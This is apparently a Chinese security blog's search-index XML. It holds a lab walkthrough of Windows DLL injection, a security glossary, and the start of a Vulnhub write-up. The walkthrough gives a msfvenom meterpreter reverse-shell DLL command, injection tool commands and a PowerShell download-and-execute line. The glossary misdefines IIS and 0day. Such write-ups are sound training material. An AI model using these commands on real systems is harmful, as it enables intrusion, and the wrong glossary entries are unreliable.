<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>提权之windows-DLL注入</title>
    <url>/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="0x00-DLL注入"><a href="#0x00-DLL注入" class="headerlink" title="0x00 DLL注入"></a>0x00 DLL注入</h2><ol>
<li>所谓DLL注入就是将一个DLL放进某个进程的地址空间里，让它成为那个进程的一部分。要实现DLL注入，首先需要打开目标进程。</li>
<li>环境：kali</li>
<li>靶场：windows server 2008 x64</li>
</ol>
<h2 id="0x01-生成DLL文件"><a href="#0x01-生成DLL文件" class="headerlink" title="0x01 生成DLL文件"></a>0x01 生成DLL文件</h2><ol>
<li>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.100.4 lport=4444 -f dll&gt;test.dll</li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/1.png" alt></li>
</ol>
<h2 id="0x02-启动msfconsole开启监听"><a href="#0x02-启动msfconsole开启监听" class="headerlink" title="0x02 启动msfconsole开启监听"></a>0x02 启动msfconsole开启监听</h2><ol>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/2.png" alt></li>
</ol>
<h2 id="0x10-DLL注入进程"><a href="#0x10-DLL注入进程" class="headerlink" title="0x10 DLL注入进程"></a>0x10 DLL注入进程</h2><h3 id="0x11-OpenArk工具注入"><a href="#0x11-OpenArk工具注入" class="headerlink" title="0x11 OpenArk工具注入"></a>0x11 OpenArk工具注入</h3><ol>
<li><a href="https://github.com/BlackINT3/OpenArk/releases" target="_blank" rel="noopener">OpenArk</a></li>
<li>启动32位、64位记事本</li>
<li>C:\Windows\System32\notepad.exe</li>
<li>C:\Windows\SysWOW64\notepad.exe</li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/3.png" alt></li>
<li>右击64位记事本进程——注入DLL——选择生成的DLL文件</li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/4.png" alt></li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/5.png" alt></li>
<li>成功反弹shell</li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/6.png" alt></li>
</ol>
<h3 id="0x12-remotedllinjector脚本注入"><a href="#0x12-remotedllinjector脚本注入" class="headerlink" title="0x12 remotedllinjector脚本注入"></a>0x12 remotedllinjector脚本注入</h3><ol>
<li><a href="https://securityxploded.com/download-software.php?name=remotedllinjector" target="_blank" rel="noopener">remotedllinjector</a></li>
<li>同样启动32位、64位记事本</li>
<li>开启任务管理器查看进程PID</li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/7.png" alt></li>
<li>RemoteDLLInjector64.exe 3968 C:\Temp\test.dll</li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/8.png" alt></li>
<li>成功反弹shell</li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/9.png" alt></li>
</ol>
<h3 id="0x13-metasploit注入"><a href="#0x13-metasploit注入" class="headerlink" title="0x13 metasploit注入"></a>0x13 metasploit注入</h3><h3 id="0x14-powersploit注入"><a href="#0x14-powersploit注入" class="headerlink" title="0x14 powersploit注入"></a>0x14 powersploit注入</h3><ol>
<li>Python2搭建简易服务器：Python -m SimpleHTTPServer 8888</li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/13.png" alt></li>
<li>靶机可以访问</li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/14.png" alt></li>
<li>powershell远程加载Invoke-DllInjection.ps1脚本</li>
<li>IEX(New-Object net.webclient).DownloadString(“<a href="http://192.168.100.1:8888/CodeExecution/Invoke-DllInjection.ps1&quot;" target="_blank" rel="noopener">http://192.168.100.1:8888/CodeExecution/Invoke-DllInjection.ps1&quot;</a>)</li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/15.png" alt></li>
<li>执行DLL注入：Invoke-DllInjection -ProcessID 3888 -Dll C:\Temp\test.dll</li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/16.png" alt></li>
<li>开启msfconsole监听端口，并反弹成功</li>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/12.png" alt></li>
</ol>
<h2 id="0x20-简单提权"><a href="#0x20-简单提权" class="headerlink" title="0x20 简单提权"></a>0x20 简单提权</h2><ol>
<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/11.png" alt></li>
</ol>
]]></content>
      <tags>
        <tag>提权</tag>
        <tag>windows</tag>
        <tag>DLL</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全百科</title>
    <url>/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%99%BE%E7%A7%91/</url>
    <content><![CDATA[<h2 id="0x00-信息安全术语"><a href="#0x00-信息安全术语" class="headerlink" title="0x00 信息安全术语"></a>0x00 信息安全术语</h2><h3 id="肉鸡"><a href="#肉鸡" class="headerlink" title="肉鸡"></a><strong>肉鸡</strong></h3><p>&ensp;&ensp;&ensp;&ensp;肉鸡也称傀儡机，是指可以被黑客远程控制的机器。比如用”灰鸽子”等诱导客户点击或者电脑被黑客攻破或用户电脑有漏洞被种植了木马，黑客可以随意操纵它并利用它做任何事情。<br>&ensp;&ensp;&ensp;&ensp;肉鸡通常被用作DDOS攻击。可以是各种系统，如windows、linux、unix等，更可以是一家公司、企业、学校甚至是政府军队的服务器。</p>
<h3 id="木马病毒-Trojan-virus"><a href="#木马病毒-Trojan-virus" class="headerlink" title="木马病毒 Trojan virus"></a><strong>木马病毒 Trojan virus</strong></h3><p>&ensp;&ensp;&ensp;&ensp;木马病毒是指隐藏在正常程序中的一段具有特殊功能的恶意代码，是具备破坏和删除文件、发送密码、记录键盘和攻击Dos等特殊功能的后门程序。木马病毒其实是计算机黑客用于远程控制计算机的程序，将控制程序寄生于被控制的计算机系统中，里应外合，对被感染木马病毒的计算机实施操作。一般的木马病毒程序主要是寻找计算机后门，伺机窃取被控计算机中的密码和重要文件等。可以对被控计算机实施监控、资料修改等非法操作。木马病毒具有很强的隐蔽性，可以根据黑客意图突然发起攻击。</p>
<h3 id="网页木马-Web-Trojan"><a href="#网页木马-Web-Trojan" class="headerlink" title="网页木马 Web Trojan"></a><strong>网页木马 Web Trojan</strong></h3><p>&ensp;&ensp;&ensp;&ensp;网页木马就是表面上伪装成普通的网页文件或是将恶意的代码直接插入到正常的网页文件中，当有人访问时，网页木马就会利用对方系统或者浏览器的漏洞自动将配置好的木马的服务端下载到访问者的电脑上来自动执行。</p>
<h3 id="挂马"><a href="#挂马" class="headerlink" title="挂马"></a><strong>挂马</strong></h3><p>&ensp;&ensp;&ensp;&ensp;所谓的挂马，就是黑客通过各种手段，包括SQL注入，网站敏感文件扫描，服务器漏洞，网站程序0day, 等各种方法获得网站管理员账号，然后登陆网站后台，通过数据库“备份/恢复”或者上传漏洞获得一个webshell。利用获得的webshell修改网站页面的内容，向页面中加入恶意转向代码。也可以直接通过弱口令获得服务器或者网站FTP，然后直接对网站页面直接进行修改。当你访问被加入恶意代码的页面时，你就会自动的访问被转向的地址或者下载木马病毒。</p>
<h3 id="后门-back-door"><a href="#后门-back-door" class="headerlink" title="后门 back door"></a><strong>后门 back door</strong></h3><p>&ensp;&ensp;&ensp;&ensp;后门，本意是指一座建筑背面开设的门，通常比较隐蔽，为进出建筑的人提供方便和隐蔽。在信息安全领域，后门是指绕过安全控制而获取对程序或系统访问权的方法。后门的最主要目的就是方便以后再次秘密进入或者控制系统。</p>
<h3 id="物联网-IOT：Internet-of-Things"><a href="#物联网-IOT：Internet-of-Things" class="headerlink" title="物联网 IOT：Internet of Things"></a><strong>物联网 IOT：Internet of Things</strong></h3><p>&ensp;&ensp;&ensp;&ensp;物联网（The Internet of Things，简称IOT）是指通过 各种信息传感器、射频识别技术、全球定位系统、红外感应器、激光扫描器等各种装置与技术，实时采集任何需要监控、 连接、互动的物体或过程，采集其声、光、热、电、力学、化 学、生物、位置等各种需要的信息，通过各类可能的网络接入，实现物与物、物与人的泛在连接，实现对物品和过程的智能化感知、识别和管理。物联网是一个基于互联网、传统电信网等的信息承载体，它让所有能够被独立寻址的普通物理对象形成互联互通的网络。</p>
<h3 id="云计算-cloud-computing"><a href="#云计算-cloud-computing" class="headerlink" title="云计算 cloud computing"></a><strong>云计算 cloud computing</strong></h3><p>&ensp;&ensp;&ensp;&ensp;云计算（cloud computing）是分布式计算的一种，指的是通过网络“云”将巨大的数据计算处理程序分解成无数个小程序，然后，通过多部服务器组成的系统进行处理和分析这些小程序得到结果并返回给用户。云计算早期，简单地说，就是简单的分布式计算，解决任务分发，并进行计算结果的合并。因而，云计算又称为网格计算。通过这项技术，可以在很短的时间内（几秒种）完成对数以万计的数据的处理，从而达到强大的网络服务。<br>&ensp;&ensp;&ensp;&ensp;现阶段所说的云服务已经不单单是一种分布式计算，而是分布式计算、效用计算、负载均衡、并行计算、网络存储、热备份冗杂和虚拟化等计算机技术混合演进并跃升的结果。</p>
<h3 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a><strong>rootkit</strong></h3><p>&ensp;&ensp;&ensp;&ensp;Rootkit是一种特殊的恶意软件，它的功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。</p>
<h3 id="ipc"><a href="#ipc" class="headerlink" title="ipc$"></a><strong>ipc$</strong></h3><p>&ensp;&ensp;&ensp;&ensp;一般指空连接，使用命令 net use url=file://\IP\ipc$\IP\ipc$ “” /user:”” 就可以简单地和目标建立一个空连接（需要目标开放ipc$）。</p>
<h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a><strong>弱口令</strong></h3><p>&ensp;&ensp;&ensp;&ensp;弱口令(weak password) 没有严格和准确的定义，通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。弱口令指的是仅包含简单数字和字母的口令，例如“123”、“abc”等，因为这样的口令很容易被别人破解，从而使用户的计算机面临风险，因此不推荐用户使用。</p>
<h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a><strong>shell</strong></h3><p>&ensp;&ensp;&ensp;&ensp;在计算机科学中，Shell俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。</p>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a><strong>webshell</strong></h3><p>&ensp;&ensp;&ensp;&ensp;webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。</p>
<h3 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a><strong>溢出</strong></h3><p>&ensp;&ensp;&ensp;&ensp;溢出是黑客利用操作系统的漏洞，专门开发了一种程序，加相应的参数运行后，就可以得到你电脑具有管理员资格的控制权，你在你自己电脑上能够运行的东西他可以全部做到，等于你的电脑就是他的了。溢出是程序设计者设计时的不足所带来的错误。</p>
<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a><strong>注入</strong></h3><p>&ensp;&ensp;&ensp;&ensp;所谓的SQL（结构化查询语言）注入，简单来说就是利用SQL语句在外部对SQL数据库进行查询，更新等动作。首先，数据库作为一个网站最重要的组件之一（如果这个网站有数据库的话），里面是储存着各种各样的内容，包括管理员的账号密码</p>
<h3 id="内网"><a href="#内网" class="headerlink" title="内网"></a><strong>内网</strong></h3><p>&ensp;&ensp;&ensp;&ensp;一般指局域网，局域网的覆盖范围一般是方圆几千米之内，其具备的安装便捷、成本节约、扩展方便等特点使其在各类办公室内运用广泛。局域网可以实现文件管理、应用软件共享、打印机共享等功能，在使用过程当中，通过维护局域网网络安全，能够有效地保护资料安全，保证局域网网络能够正常稳定的运行。</p>
<h3 id="外网"><a href="#外网" class="headerlink" title="外网"></a><strong>外网</strong></h3><p>&ensp;&ensp;&ensp;&ensp;一般指广域网，广域网（英语：Wide Area Network，缩写为 WAN），又称广域网、外网、公网。是连接不同地区局域网或城域网计算机通信的远程网。通常跨接很大的物理范围，所覆盖的范围从几十公里到几千公里，它能连接多个地区、城市和国家，或横跨几个洲并能提供远距离通信，形成国际性的远程网络。广域网并不等同于互联网。</p>
<h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a><strong>端口</strong></h3><p>&ensp;&ensp;&ensp;&ensp;”端口”是英文port的意译，可以认为是设备与外界通讯交流的出口。端口可分为虚拟端口和物理端口，其中虚拟端口指计算机内部或交换机路由器内的端口，不可见。例如计算机中的80端口、21端口、23端口等。物理端口又称为接口，是可见端口，计算机背板的RJ45网口，交换机路由器集线器等RJ45端口。电话使用RJ11插口也属于物理端口的范畴。</p>
<h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a><strong>免杀</strong></h3><p>&ensp;&ensp;&ensp;&ensp;免杀技术全称为反杀毒技术Anti Anti- Virus简称“免杀”，它指的是一种能使病毒木马免于被杀毒软件查杀的技术。由于免杀技术的涉猎面非常广，其中包含反汇编、逆向工程、系统漏洞等黑客技术，所以难度很高，一般人不会或没能力接触这技术的深层内容。其内容基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀。</p>
<h3 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a><strong>加壳</strong></h3><p>&ensp;&ensp;&ensp;&ensp;加壳的另一种常用的方式是在二进制的程序中植入一段代码，在运行的时候优先取得程序的控制权，之后再把控制权交还给原始代码，这样做的目的是隐藏程序真正的OEP（入口点，防止被破解）。大多数病毒就是基于此原理。<br>&ensp;&ensp;&ensp;&ensp;加壳的程序需要阻止外部程序或软件对加壳程序本身的反汇编分析或者动态分析，以达到保护壳内原始程序以及软件不被外部程序破坏，保证原始程序正常运行。<br>&ensp;&ensp;&ensp;&ensp;这种技术也常用来保护软件版权，防止软件被破解。但对于病毒，加壳可以绕过一些杀毒软件的扫描，从而实现它作为病毒的一些入侵或破坏的一些特性。</p>
<h3 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a><strong>花指令</strong></h3><p>&ensp;&ensp;&ensp;&ensp;花指令是，由设计者特别构思，希望使反汇编的时候出错，让破解者无法清楚正确地反汇编程序的内容，迷失方向。经典的是，目标位置是另一条指令的中间，这样在反汇编的时候便会出现混乱。花指令有可能利用各种指令：jmp, call, ret的一些堆栈技巧，位置运算，等等</p>
<h3 id="域名系统器-DNS-Domain-Name-System"><a href="#域名系统器-DNS-Domain-Name-System" class="headerlink" title="域名系统器 DNS Domain Name System"></a><strong>域名系统器 DNS Domain Name System</strong></h3><p>&ensp;&ensp;&ensp;&ensp;DNS（Domain Name Server，域名服务器）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名(domain name)和与之相对应的IP地址 (IP address)的表，以解析消息的域名。 域名是Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。域名是由一串用点分隔的名字组成的，通常包含组织名，而且始终包括两到三个字母的后缀，以指明组织的类型或该域所在的国家或地区。</p>
<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a><strong>脚本</strong></h3><p>&ensp;&ensp;&ensp;&ensp;脚本（Script）是一种批处理文件的延伸，是一种纯文本保存的程序，一般来说的计算机脚本程序是确定的一系列控制计算机进行运算操作动作的组合，在其中可以实现一定的逻辑分支等。</p>
<h3 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a><strong>转义字符</strong></h3><p>&ensp;&ensp;&ensp;&ensp;所有的ASCII码都可以用“\”加数字（一般是8进制数字）来表示。而C中定义了一些字母前加”&quot;来表示常见的那些不能显示的ASCII字符，如\0,\t,\n等，就称为转义字符，因为后面的字符，都不是它本来的ASCII字符意思了。</p>
<h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a><strong>CDN</strong></h3><p>&ensp;&ensp;&ensp;&ensp;CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p>
<h3 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a><strong>cookie欺骗</strong></h3><p>&ensp;&ensp;&ensp;&ensp;现在有很多社区网为了方便网友浏览，都使用了cookie技术以避免多次输入密码（就如the9和vr），所以只要对服务器递交给用户的cookie进行改写就可以达到欺骗服务程序的目的。<br>&ensp;&ensp;&ensp;&ensp;COOKIE欺骗原理：按照浏览器的约定，只有来自同一域名的cookie才可以读写，而cookie只是浏览器的，对通讯协议无影响。</p>
<h3 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a><strong>上传漏洞</strong></h3><p>&ensp;&ensp;&ensp;&ensp;这个漏洞在DVBBS6.0时代被黑客们利用的最为猖獗，利用上传漏洞可以直接得到WEBSHELL，危害等级超级高，入侵中上传漏洞也是常见的漏洞。<br>&ensp;&ensp;&ensp;&ensp;导致该漏洞的原因在于代码作者没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。</p>
<h3 id="ARP攻击"><a href="#ARP攻击" class="headerlink" title="ARP攻击"></a><strong>ARP攻击</strong></h3><p>&ensp;&ensp;&ensp;&ensp;ARP（Address Resolution Protocol，地址解析协议）是一个位于TCP/IP协议栈中的网络层，负责将某个IP地址解析成对应的MAC地址。<br>&ensp;&ensp;&ensp;&ensp;ARP 病毒攻击是局域网最常见的一种攻击方式。由于TCP/IP协议存在的一些漏洞给ARP病毒有进行欺骗攻击的机会，ARP利用TCP/IP协议的漏洞进行欺骗攻击，现已严重影响到人们正常上网和通信安全。当局域网内的计算机遭到ARP的攻击时，它就会持续地向局域网内所有的计算机及网络通信设备发送大量的ARP欺骗数据包，如果不及时处理，便会造成网络通道阻塞、网络设备的承载过重、网络的通讯质量不佳等情况。</p>
<h3 id="暴库"><a href="#暴库" class="headerlink" title="暴库"></a><strong>暴库</strong></h3><p>&ensp;&ensp;&ensp;&ensp;暴库，就是通过一些技术手段或者程序漏洞得到数据库的地址，并将数据非法下载到本地。黑客非常乐意于这种工作，为什么呢？因为黑客在得到网站数据库后，就能得到网站管理账号，对网站进行破坏与管理，黑客也能通过数据库得到网站用户的隐私信息，甚至得到服务器的最高权限。</p>
<h3 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a><strong>网络钓鱼</strong></h3><p>&ensp;&ensp;&ensp;&ensp;网络钓鱼（Phishing，与钓鱼的英语fishing发音相近，又名钓鱼法或钓鱼式攻击）是通过大量发送声称来自于银行或其他知名机构的欺骗性垃圾邮件，意图引诱收信人给出敏感信息（如用户名、口令、帐号 ID 、 ATM PIN 码或信用卡详细信息）的一种攻击方式。</p>
<h3 id="蜜罐技术"><a href="#蜜罐技术" class="headerlink" title="蜜罐技术"></a><strong>蜜罐技术</strong></h3><p>&ensp;&ensp;&ensp;&ensp;蜜罐技术本质上是一种对攻击方进行欺骗的技术，通过布置一些作为诱饵的主机、网络服务或者信息，诱使攻击方对它们实施攻击，从而可以对攻击行为进行捕获和分析，了解攻击方所使用的工具与方法，推测攻击意图和动机，能够让防御方清晰地了解他们所面对的安全威胁，并通过技术和管理手段来增强实际系统的安全防护能力。<br>&ensp;&ensp;&ensp;&ensp;蜜罐好比是情报收集系统。蜜罐好像是故意让人攻击的目标，引诱黑客前来攻击。所以攻击者入侵后，你就可以知道他是如何得逞的，随时了解针对服务器发动的最新的攻击和漏洞。还可以通过窃听黑客之间的联系，收集黑客所用的种种工具，并且掌握他们的社交网络。</p>
<h3 id="拒绝服务攻击-DOS"><a href="#拒绝服务攻击-DOS" class="headerlink" title="拒绝服务攻击 DOS"></a><strong>拒绝服务攻击 DOS</strong></h3><p>&ensp;&ensp;&ensp;&ensp;拒绝服务攻击即是攻击者想办法让目标机器停止提供服务，是黑客常用的攻击手段之一。其实对网络带宽进行的消耗性攻击只是拒绝服务攻击的一小部分，只要能够对目标造成麻烦，使某些服务被暂停甚至主机死机，都属于拒绝服务攻击。拒绝服务攻击问题也一直得不到合理的解决，究其原因是因为网络协议本身的安全缺陷，从而拒绝服务攻击也成为了攻击者的终极手法。攻击者进行拒绝服务攻击，实际上让服务器实现两种效果：一是迫使服务器的缓冲区满，不接收新的请求；二是使用IP欺骗，迫使服务器把非法用户的连接复位，影响合法用户的连接。</p>
<h3 id="跳板"><a href="#跳板" class="headerlink" title="跳板"></a><strong>跳板</strong></h3><p>&ensp;&ensp;&ensp;&ensp;跳板，简单来说，就是为了隐藏自己的地址，让别人无法查找到自己的位置。</p>
<h3 id="旁注"><a href="#旁注" class="headerlink" title="旁注"></a><strong>旁注</strong></h3><p>&ensp;&ensp;&ensp;&ensp;旁注是一种入侵方法，在字面上解释就是－”从旁注入”，利用同一主机上面不同网站的漏洞得到webshell，从而利用主机上的程序或者是服务所暴露的用户所在的物理路径进行入侵。</p>
<h3 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a><strong>Telnet</strong></h3><p>&ensp;&ensp;&ensp;&ensp;Telnet协议是TCP/IP协议族中的一员，是Internet远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。要开始一个telnet会话，必须输入用户名和密码来登录服务器。Telnet是常用的远程控制Web服务器的方法。</p>
<h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a><strong>ftp</strong></h3><p>&ensp;&ensp;&ensp;&ensp;文件传输协议（File Transfer Protocol，FTP）是用于在网络上进行文件传输的一套标准协议，它工作在 OSI 模型的第七层， TCP 模型的第四层， 即应用层， 使用 TCP 传输而不是 UDP， 客户在和服务器建立连接前要经过一个“三次握手”的过程， 保证客户与服务器之间的连接是可靠的， 而且是面向连接， 为数据传输提供可靠保证。 [1]<br>&ensp;&ensp;&ensp;&ensp;FTP允许用户以文件操作的方式（如文件的增、删、改、查、传送等）与另一主机相互通信。然而， 用户并不真正登录到自己想要存取的计算机上面而成为完全用户， 可用FTP程序访问远程资源， 实现用户往返传输文件、目录管理以及访问电子邮件等等， 即使双方计算机可能配有不同的操作系统和文件存储方式。</p>
<h3 id="smtp"><a href="#smtp" class="headerlink" title="smtp"></a><strong>smtp</strong></h3><p>&ensp;&ensp;&ensp;&ensp;SMTP是一种提供可靠且有效的电子邮件传输的协议。SMTP是建立在FTP文件传输服务上的一种邮件服务，主要用于系统之间的邮件信息传递，并提供有关来信的通知。SMTP独立于特定的传输子系统，且只需要可靠有序的数据流信道支持，SMTP的重要特性之一是其能跨越网络传输邮件，即“SMTP邮件中继”。使用SMTP，可实现相同网络处理进程之间的邮件传输，也可通过中继器或网关实现某处理进程与其他网络之间的邮件传输。</p>
<h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a><strong>代理</strong></h3><p>&ensp;&ensp;&ensp;&ensp;代理服务器（Proxy Server）是一种重要的服务器安全功能，它的工作主要在开放系统互联(OSI)模型的会话层，从而起到防火墙的作用。代理服务器大多被用来连接INTERNET（国际互联网）和INTRANET（局域网）。<br>&ensp;&ensp;&ensp;&ensp;C#语言中，代理是指Delegate，也翻译为委托。C#中的delegate和C++中的函数指针基本是一回事，C#正是以delegate的形式实现了函数指针。不同的地方在于C#中delegate是类型安全的。<br>&ensp;&ensp;&ensp;&ensp;delegate仅仅关注涉及的方法（函数）的细节。它是一种类型，这种类型的变量可以用来赋值不同（但类似）的方法（函数）。说白了，即是将处理代码“放置”到变量中，“执行”这个变量，就是执行这个变量中“放置”的代码。</p>
<h3 id="iis"><a href="#iis" class="headerlink" title="iis"></a><strong>iis</strong></h3><p>&ensp;&ensp;&ensp;&ensp;”IIS”即(Internet Identity system)中文翻译为“互联网识别体系。”IIS”在人们日常的工作中，是指企业有意识，有计划地将自己企业的CI特征通过互联网向社会公众主动地展示与传播，使公众在互联网中对企业有一个可管理、符合企业传播规范的印象和认识，以便消费者更好地认知并留下良好的印象。</p>
<h3 id="0day"><a href="#0day" class="headerlink" title="0day"></a><strong>0day</strong></h3><p>&ensp;&ensp;&ensp;&ensp;0day泛指所有在官方发布该作品之前或者当天，这主要涵盖了影视、软件、游戏、音乐、资料等方面，由一些特别小组以一定的格式打包发布的数码内容。基本上每个0day发布作品中都包含了说明该发布作品的NFO文件，该文件主要包括发布小组的信息、发布作品的信息、破解信息等。nfo文件有专门的软件来查看，其实系统自带的记事本也可以查看。</p>
<h3 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a><strong>google hacking</strong></h3><p>&ensp;&ensp;&ensp;&ensp;Google Hacking的含义原指利用Google Google搜索引擎搜索信息来进行入侵的技术和行为；</p>
<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a><strong>exploit</strong></h3><p>&ensp;&ensp;&ensp;&ensp;Exploit 的英文意思就是利用，它在黑客眼里就是漏洞利用。有漏洞不一定就有Exploit（利用)，有Exploit就肯定有漏洞。</p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a><strong>XSS</strong></h3><p>&ensp;&ensp;&ensp;&ensp;跨站脚本攻击（也称为XSS）指利用网站漏洞从用户那里恶意盗取信息。</p>
<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a><strong>CSRF</strong></h3><p>&ensp;&ensp;&ensp;&ensp;跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p>
<h3 id="嗅探"><a href="#嗅探" class="headerlink" title="嗅探"></a><strong>嗅探</strong></h3><p>&ensp;&ensp;&ensp;&ensp;一般指嗅探器。嗅探器 可以获取网络上流经的数据包。 用集线器hub组建的网络是基于共享的原理的， 局域网内所有的计算机都接收相同的数据包， 而网卡构造了硬件的“过滤器“ 通过识别MAC地址过滤掉和自己无关的信息， 嗅探程序只需关闭这个过滤器， 将网卡设置为“混杂模式“就可以进行嗅探 用交换机switch组建的网络是基于“交换“原理的 ，交换机不是把数据包发到所有的端口上， 而是发到目的网卡所在的端口。</p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a><strong>提权</strong></h3><p>&ensp;&ensp;&ensp;&ensp;提高自己在服务器中的权限，主要针对网站入侵过程中，当入侵某一网站时，通过各种漏洞提升WEBSHELL权限以夺得该服务器权限。</p>
<h3 id="CGI-通用网关接口"><a href="#CGI-通用网关接口" class="headerlink" title="CGI 通用网关接口"></a><strong>CGI 通用网关接口</strong></h3><p>&ensp;&ensp;&ensp;&ensp;公共网关接口（Common Gateway Interface，CGI）是Web 服务器运行时外部程序的规范，按CGI 编写的程序可以扩展服务器功能。CGI 应用程序能与浏览器进行交互，还可通过数据API与数据库服务器等外部数据源进行通信，从数据库服务器中获取数据。格式化为HTML文档后，发送给浏览器，也可以将从浏览器获得的数据放到数据库中。几乎所有服务器都支持CGI，可用任何语言编写CGI，包括流行的C、C ++、Java、VB 和Delphi 等。CGI分为标准CGI和间接CGI两种。标准CGI使用命令行参数或环境变量表示服务器的详细请求，服务器与浏览器通信采用标准输入输出方式。间接CGI又称缓冲CGI，在CGI程序和CGI接口之间插入一个缓冲程序，缓冲程序与CGI接口间用标准输入输出进行通信。</p>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://baike.baidu.com/" target="_blank" rel="noopener">百度百科</a></li>
</ol>
]]></content>
      <tags>
        <tag>知识</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub之Holynix-v1</title>
    <url>/vulnhub%E4%B9%8BHolynix-v1/</url>
    <content><![CDATA[<h2 id="0x00-Holynix-v1"><a href="#0x00-Holynix-v1" class="headerlink" title="0x00 Holynix: v1"></a>0x00 Holynix: v1</h2><ol>
<li><a href="https://www.vulnhub.com/entry/holynix-v1,20/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/holynix-v1,20/</a></li>
</ol>
<h2 id="0x01-Do"><a href="#0x01-Do" class="headerlink" title="0x01 Do"></a>0x01 Do</h2><ol>
<li>netdiscover扫描存活靶场的IP：192.168.100.12</li>
<li>nmap扫描端口</li>
<li><img src="/vulnhub%E4%B9%8BHolynix-v1/1.png" alt></li>
<li>访问80</li>
<li><img src="/vulnhub%E4%B9%8BHolynix-v1/2.png" alt></li>
<li>登录测试，输入单引号’</li>
